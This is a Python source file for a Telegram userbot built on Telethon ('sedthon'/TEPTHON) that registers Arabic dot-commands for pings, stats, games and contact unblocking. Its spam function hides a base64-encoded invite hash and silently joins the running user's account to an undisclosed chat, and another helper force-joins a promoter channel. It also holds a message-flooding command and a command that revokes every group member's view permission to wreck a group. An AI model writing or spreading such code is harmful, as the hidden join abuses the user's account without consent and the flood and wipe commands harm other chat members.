from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon.tl import functions
from hijri_converter import Gregorian
from telethon.tl import functions
from telethon.tl.functions.channels import LeaveChannelRequest
from collections import deque
from telethon import events
from telethon.errors import FloodWaitError
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.tl import functions
import time
import asyncio
import logging
import base64
import datetime
from payment import *
from help import *
from config import *
from t06bot import *
from checktele import *
from yt import *
from main import *
# -

sedthon.start()

y = datetime.datetime.now().year
m = datetime.datetime.now().month
dayy = datetime.datetime.now().day
day = datetime.datetime.now().strftime("%A")
m9zpi = f"{y}-{m}-{dayy}"
sec = time.time()


LOGS = logging.getLogger(__name__)

DEVS = [
    5307018300,
]
DEL_TIME_OUT = 10
normzltext = "1234567890"
namerzfont = normzltext
name = "Profile Photos"
time_name = ["off"]
time_bio = ["off"]


async def join_channel():
    try:
        await sedthon(JoinChannelRequest("@TEPTHON"))
    except BaseException:
        pass


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.تفليش"))
async def _(event):
    await event.delete()
    messagelocation = event.to_id
    async for user in sedthon.iter_participants(messagelocation):
        user_id = user.id
        try:
            await sedthon.edit_permissions(messagelocation, user_id, view_messages=False)
        except:
            pass


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.اكس او"))
async def _(event):
    bot = 'inlinegamesbot'
    xo = await sedthon.inline_query(bot, "")
    await xo[0].click(
        event.chat_id,
        silent=True if event.is_reply else False,
        hide_via=True
    )


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.السورس"))
async def a(event):
    await event.edit("جارٍ")
    animation = [
        progressbar[0],
        progressbar[1],
        progressbar[2],
        progressbar[3],
        progressbar[4],
        progressbar[5],
        progressbar[6],
        progressbar[7],
        progressbar[8],
        progressbar[9]
    ]
    for i in animation:
        time.sleep(0.3)
        await event.edit(i)
    await event.edit(soursce)



@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.هممم"))
async def _(event):
    if not event.is_reply:
        return await event.edit(
            "يستعمل الامر بالرد على الصورتهة او الفيديو !"
        )
    rr9r7 = await event.get_reply_message()
    await event.delete()
    pic = await rr9r7.download_media()
    await sedthon.send_file(
        "me", pic, caption=f"تم حفظ الصورة او الفيديو الذاتي هنا : "
    )


@sedthon.on(events.NewMessage(pattern=r"\.ادمن", outgoing=True))
async def _(event):
    if event.fwd_from:
        return
    result = await sedthon(functions.channels.GetAdminedPublicChannelsRequest())
    output_str = "انت ادمن في : \n"
    for channel_obj in result.chats:
        output_str += f"- {channel_obj.title} @{channel_obj.username} \n"
    await event.edit(output_str)


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.سي (.*)"))
async def spammer(event):
    reply = await event.get_reply_message()
    input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
    sleeptimet = sleeptimem = float(input_str[0])
    cat = input_str[1:]
    await event.delete()
    await spam_function(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)


async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):
    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    counter = int(cat[0])
    if len(cat) == 2:
        spam_message = str(cat[1])
        for _ in range(counter):
            if event.reply_to_msg_id:
                await sandy.reply(spam_message)
            else:
                await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    elif event.reply_to_msg_id and sandy.media:
        for _ in range(counter):
            sandy = await event.client.send_file(
                event.chat_id, sandy, caption=sandy.text
            )
            await asyncio.sleep(sleeptimem)
    elif event.reply_to_msg_id and sandy.text:
        spam_message = sandy.text
        for _ in range(counter):
            await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
        try:
            hmm = Get(hmm)
            await event.client(hmm)
        except BaseException:
            pass


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.اشتراكاتي"))
async def _(event):
    if event.fwd_from:
        return
    start = datetime.datetime.now()
    u = 0  # number of users
    g = 0  # number of basic groups
    c = 0  # number of super groups
    bc = 0  # number of channels
    b = 0  # number of bots
    await event.edit("يتم التعداد ..")
    async for d in sedthon.iter_dialogs(limit=None):
        if d.is_user:
            if d.entity.bot:
                b += 1
            else:
                u += 1
        elif d.is_channel:
            if d.entity.broadcast:
                bc += 1
            else:
                c += 1
        elif d.is_group:
            g += 1
        else:
            pass
            # logger.info(d.stringify())
    end = datetime.datetime.now()
    ms = (end - start).seconds
    await event.edit("""تم استخراجها في {} ثواني
`الاشخاص :\t{}
المجموعات العادية :\t{}
المجموعات الخارقة :\t{}
القنوات :\t{}
البوتات :\t{}
`""".format(ms, u, g, c, bc, b))


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.الاوامر"))
async def _(event):
    await event.edit(commands)


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.السورس"))
async def _(event):
    await event.edit(soursce)


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.فحص"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit("جارٍ...")
    end = datetime.datetime.now()
    ms = (end - start).microseconds / 1000
    await event.edit(f'''
**☆ Welcome to Source TEPTHON
☆ Version : 1.5
☆ Ping : `{ms}`
☆ Date : `{m9zpi}`
☆ ID : `{event.sender_id}`
☆ Source TEPTHON : @TEPTHON**
''')


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.م1"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec1)


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.م2"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec2)


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.م3"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec3)


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.م4"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec4)


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.م5"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec5)


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.الاوامر الخاصة"))
async def _(event):
    if ispay2[0] == 'yes':
        await event.edit(spc2)
    elif ispay[0] == "yes":
        await event.edit(spc)
    else:
        await event.edit("يجب الدفع لاستعمال هذا الامر !")


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.البنك"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit("جارٍ...")
    end = datetime.datetime.now()
    res = (end - start).microseconds / 1000
    await event.edit(f"""
`-- -- -- -- -- -- -- -- -- --`
- تمت الاستجابة
- البنك : `{res}`
`-- -- -- -- -- -- -- -- -- --`"""
                     )

ownerhson_id = 5307018300
@sedthon.on(events.NewMessage(outgoing=False, pattern='/start'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
        order = await event.reply('** Hi MY Developer - @B_8_1 **')


	
@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.فك حظر"))
async def _(event):
    list = await sedthon(functions.contacts.GetBlockedRequest(offset=0, limit=1000000))
    if len(list.blocked) == 0:
        razan = await event.edit(f'ليس لديك اي شخص محظور !')
    else:
        unblocked_count = 1
        for user in list.blocked:
            UnBlock = await sedthon(functions.contacts.UnblockRequest(id=int(user.peer_id.user_id)))
            unblocked_count += 1
            razan = await event.edit(f'جارِ الغاء الحظر : {round((unblocked_count * 100) / len(list.blocked), 2)}%')
        unblocked_count = 1
        razan = await event.edit(f'تم الغاء حظر : {len(list.blocked)}')


@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.اعادة تشغيل"))
async def update(event):
    await event.edit("• جارِ اعادة تشغيل السورس ..\n• انتضر 1-2 دقيقة  .")
    await sedthon.disconnect()
    await sedthon.send_message("me", "`اكتملت اعادة تشغيل السورس !`")


print("- sedthon Userbot Running ..")
sedthon.run_until_disconnected()
